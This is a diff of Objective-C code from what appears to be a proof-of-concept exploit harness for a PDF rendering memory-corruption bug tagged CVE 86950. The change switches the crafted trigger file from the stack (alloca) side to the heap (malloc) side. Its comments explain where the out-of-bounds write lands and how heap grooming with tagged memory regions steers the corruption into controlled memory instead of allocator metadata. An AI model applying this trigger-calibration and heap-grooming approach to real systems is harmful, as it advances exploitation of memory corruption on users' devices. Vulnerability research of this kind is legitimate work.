@@ -281,7 +281,7 @@ static void ModSweepLeaf(void) {
 // clean in another), so a single render cannot be calibrated -- a series can.
 // R86950_REPEAT=<n> sets the count (default 40).
 static void ModRepeatCalibrated(void) {
-    NSString *cal = @"lf_dx31_008000.pdf";
+    NSString *cal = @"lf_dx33_000500.pdf";   // the heap (malloc) side
     NSString *calPath = [[NSBundle mainBundle].bundlePath
                          stringByAppendingPathComponent:cal];
     if (![[NSFileManager defaultManager] fileExistsAtPath:calPath]) return;
@@ -320,12 +320,13 @@ NSString *ModCVE86950(void) {
         AvePost(@"86950 verdict: CONTROL failed — the thumbnail path is broken, not the bug");
         return [NSString stringWithFormat:@"86950: CONTROL failed (%@)", ctl];
     }
-    // The calibrated trigger: DX=31 (the alloca side of the coverage buffer) with
-    // the leaf coordinate at 8000 -- the sweep found leaf 500..4000 render clean
-    // and 8000 kills the process, so the write is live there.  Groom first: with
-    // 64 tagged 8 MB regions ahead of the render, a write that lands inside them
-    // changes the marker, which proves the corruption without needing a crash.
-    NSString *cal = @"lf_dx31_008000.pdf";
+    // The calibrated trigger for the heap side: DX=33 (malloc, per the generator's
+    // own comment: DX <= 31 -> alloca/stack, DX >= 32 -> malloc/heap).  The
+    // crash report proves this is where the write lands: the freelist
+    // consistency check in xzm_xzone_malloc_freelist_outlined trips on the next
+    // allocation, i.e. the previous render's OOB hit malloc metadata.  Groom
+    // first so that what it hits is OUR tagged memory instead of metadata.
+    NSString *cal = @"lf_dx33_000500.pdf";
     NSString *calPath = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:cal];
     if ([[NSFileManager defaultManager] fileExistsAtPath:calPath]) {
         AvePost([NSString stringWithFormat:@"86950 CALIBRATED TRIGGER %@ + groom", cal]);
